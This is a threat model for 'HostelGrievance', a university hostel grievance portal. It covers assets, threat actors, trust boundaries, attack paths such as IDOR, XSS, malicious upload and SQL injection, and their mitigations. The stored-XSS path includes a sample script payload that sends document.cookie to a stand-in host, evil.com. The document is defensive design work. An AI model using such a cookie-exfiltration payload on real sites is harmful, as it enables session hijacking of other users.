# Threat Model — HostelGrievance

## 1. System Overview & Scope

**HostelGrievance** is a university web portal providing grievance management for hostel residents (Students) and hostel administrators (Wardens). 
- **Frontend**: Svelte 5 / SvelteKit 2 SPA client running in the user's browser.
- **Backend API**: Hono v4 on Node.js handling authentication, authorization, SQLite data operations, and file storage.
- **Data Store**: Local SQLite database file (`data/hostel.db`).
- **File Store**: Local filesystem attachment directory (`uploads/`).

---

## 2. Assets & Data Classification

| Asset | Classification | Security Objectives |
| :--- | :--- | :--- |
| **Student Account Information** | Confidential | Protect user profile, room assignments, and email addresses from enumeration or harvesting. |
| **Warden Account Information** | Confidential | Protect warden identities, credentials, and administrative credentials. |
| **Authentication & Session Tokens** | Critical Secret | Prevent token forgery, hijacking, prediction, and post-logout replay. |
| **Password Hashes** | Critical Secret | Protect against offline dictionary/rainbow-table attacks using salted key derivation (`scrypt`). |
| **Grievance Records & Descriptions** | Confidential / Integrity | Ensure grievance contents are visible only to the filing student and authorized wardens. Prevent unauthorized modification. |
| **Grievance Comments & Dialogue** | Confidential / Integrity | Ensure communications remain strictly between the student owner and wardens. Prevent Stored XSS injection. |
| **Attachment Files & Metadata** | Confidential / Integrity | Protect uploaded images from unauthorized download, path traversal, and malicious script execution. |
| **SQLite Database File (`hostel.db`, `-wal`, `-shm`)** | Critical / Confidential | Prevent direct web access, unauthorized reads/writes, or path leakage. |
| **Filesystem & Source Code** | Integrity | Prevent arbitrary file writes, script uploads, or overwrite attacks. |
| **Audit Logs** | Integrity / Confidentiality | Maintain tamper-evident logs for security events without recording passwords or secrets. |

---

## 3. Threat Actors & Capabilities

### 3.1 Unauthenticated Attacker
- **Capabilities**: Remote network access, public endpoint discovery, automated fuzzing, brute-force password attacks, cookie tampering.
- **Goals**: Bypass authentication, discover private endpoints, upload unauthenticated files, exploit server vulnerabilities to gain initial access.

### 3.2 Normal Student
- **Capabilities**: Valid student credentials, browser interaction with legitimate workflows (file grievances, view own dashboard, comment, upload photos).
- **Security Boundary**: Must only access and mutate resources belonging to their own user ID (`stu-*`).

### 3.3 Malicious Student (Insider Threat)
- **Capabilities**: Valid authenticated session, browser developer tools, custom API scripts (curl, Postman), ability to craft arbitrary JSON/multipart payloads, manipulate IDs, tamper with parameters.
- **Goals**: Read other students' private grievances (IDOR), edit or delete other students' records, alter ticket status, download other students' attachments, inject Stored XSS into grievance comments, upload malicious executables.

### 3.4 Normal Warden
- **Capabilities**: Valid warden credentials, administrative dashboard access across all hostel students, ability to update statuses and post official comments.
- **Security Boundary**: May view all grievances and change statuses, but cannot edit student grievance descriptions/titles or access server filesystem/DB directly.

### 3.5 Compromised Session Attacker
- **Capabilities**: Possession of a stolen or intercepted session cookie.
- **Goals**: Elevate privileges from student to warden, access historic data, maintain persistent access.

### 3.6 Compromised Application Process
- **Capabilities**: Arbitrary code execution within the Node.js process.
- **Goals**: Lateral movement across host system, reading sensitive filesystem data, establishing reverse shells.

---

## 4. Trust Boundaries & Data Flows

```
┌─────────────────────────────────────────────────────────────┐
│ 1. Browser Client (Untrusted Environment)                  │
│    - Attacker controls JavaScript runtime, DOM, HTTP headers│
└──────────────────────────────┬──────────────────────────────┘
                               │ [Trust Boundary 1: Network & Origin]
                               │ TLS / CORS Allowlist / Security Headers
                               ▼
┌─────────────────────────────────────────────────────────────┐
│ 2. Backend API Router & Authentication (Hono)               │
│    - Session cookie verification (HttpOnly, Expiration)     │
│    - Rate limiting & input size validation                  │
└──────────────────────────────┬──────────────────────────────┘
                               │ [Trust Boundary 2: Identity & Session]
                               │ Validated SessionUser (userId, role)
                               ▼
┌─────────────────────────────────────────────────────────────┐
│ 3. Authorization & Object-Level Policy (BOLA Defense)       │
│    - assertCanViewGrievance(user, grievanceRow)             │
│    - Student ownership enforcement (row.student_id === uid) │
│    - Role boundary enforcement (Warden vs Student)          │
└──────────────────────────────┬──────────────────────────────┘
                               │ [Trust Boundary 3: Data Access]
                               │ Parameterized SQL / Validated File Path
                               ▼
┌─────────────────────────────────────────────────────────────┐
│ 4. Storage & Persistence Boundary                           │
│    - Local SQLite (`data/hostel.db`) (Restricted perms)     │
│    - Isolated Uploads Storage (`uploads/`) (Random Hex Names)│
└─────────────────────────────────────────────────────────────┘
```

### Trust Boundary Analysis:
1. **Browser ➔ API Router**: No client-supplied headers or JSON parameters are trusted. Input validation, sanitization, and rate limits are enforced immediately.
2. **API Router ➔ Authorization Layer**: Authentication establishes *who* the caller is, but *never* grants blanket object access. Every resource request is checked against the target record's owner ID.
3. **Authorization Layer ➔ SQLite / Filesystem**: All queries use parameterized SQL prepared statements. All file operations resolve within canonicalized boundaries and use unguessable random names.

---

## 5. Important Attack Paths & Blast-Radius Mitigation

### Path 1: IDOR / BOLA on Grievance Records (`GET /api/grievances/:id`)
- **Entry Point**: URL parameter `:id` (e.g. `GET /api/grievances/GRV-0003`).
- **Attacker Capability**: Authenticated student modifying the grievance ID to another student's ticket.
- **Defense Mechanism**: Server fetches record, executes `assertCanViewGrievance(user, row)`, and checks `if (user.role === 'student' && row.student_id !== user.id) throw 403`.
- **Blast Radius If Control Fails**: Constrained to grievance metadata. Secondary defenses (separate attachment check, comment authorization check) prevent cascading data leakage.

### Path 2: Stored Cross-Site Scripting (XSS) via Comments
- **Entry Point**: `POST /api/grievances/:id/comments` with payload `<script>document.location='http://evil.com/?c='+document.cookie</script>`.
- **Attacker Capability**: Authenticated user posting comments that are rendered in other users' browsers via `{@html comment.body}`.
- **Defense Mechanism**:
  1. Server-side HTML entity sanitization (`sanitizeText`) encodes `<` and `>` into `&lt;` and `&gt;`.
  2. Session cookies are protected with `HttpOnly`, making cookies inaccessible to JavaScript even if an XSS bypass occurred.
- **Blast Radius If Control Fails**: Cookies cannot be exfiltrated due to `HttpOnly`.

### Path 3: Malicious File Upload & Remote Code Execution (RCE)
- **Entry Point**: `POST /api/grievances/:id/attachments` with a webshell or executable renamed to `shell.php` or `shell.png`.
- **Attacker Capability**: Multipart upload containing malicious code.
- **Defense Mechanism**:
  1. **File Signature / Magic Bytes**: Server inspects initial bytes (`validateImageSignature`) and rejects non-image binaries.
  2. **Storage Isolation**: Server completely discards user-supplied filename and writes bytes as `<random16Hex>.png` in `uploads/`.
  3. **Execution Prevention**: The uploads directory is not served as executable scripts.
  4. **Serving Headers**: Served with `X-Content-Type-Options: nosniff` and `Content-Security-Policy: default-src 'none'; sandbox`.
- **Blast Radius If Control Fails**: File is stored with random name and cannot be directly addressed or executed on the server.

### Path 4: Privilege Escalation & Status Manipulation
- **Entry Point**: `PATCH /api/grievances/:id` with `{"status": "Resolved"}` from a Student account.
- **Attacker Capability**: Authenticated student sending warden-only status fields.
- **Defense Mechanism**: Backend switch on `user.role` strictly rejects `status` modifications from students (`403 Forbidden`) and forbids content edits from wardens.
- **Blast Radius If Control Fails**: Status changes are recorded in audit logs with timestamp and user ID for immediate detection and rollback.

### Path 5: Database Direct Exposure / SQL Injection
- **Entry Point**: SQL queries constructed from request inputs.
- **Attacker Capability**: SQL injection payloads in title, search, ID, or comment bodies.
- **Defense Mechanism**: 100% of SQLite database queries use parameterized prepared statements (`better-sqlite3` `prepare(...).run/get/all(params)`).
- **Blast Radius If Control Fails**: Database permissions are restricted to the local user process; database is outside web root.

---

## 6. Blast Radius Matrix

| Failure Scenario | Single Point of Failure? | Secondary Containment Control | Resulting Blast Radius |
| :--- | :--- | :--- | :--- |
| **Authentication Bypassed** | No | Object-level authorization and user session validation still required on all protected data endpoints. | Attacker cannot access grievances without valid session binding. |
| **Student Ownership Check Missed** | No | Direct database access is blocked; audit logs track unauthorized access; attachments and comments require independent checks. | Exposure limited to single grievance record; no system-wide compromise. |
| **Malicious File Uploaded** | No | Magic bytes verified, disk filename randomized, served with `nosniff` + `sandbox`, uploads stored outside web root. | File stored as inert bytes; zero execution capability. |
| **Session Cookie Stolen** | No | `SameSite=Lax` prevents CSRF; `HttpOnly` blocks JS access; TTL auto-expires token; user logout destroys DB record. | Access strictly bounded to victim student's account until session expiration. |
| **Server Error Occurs** | No | `handleError` masks all internal 500 errors into generic response; stack traces and SQL queries logged only to server console. | Zero information disclosure to client. |
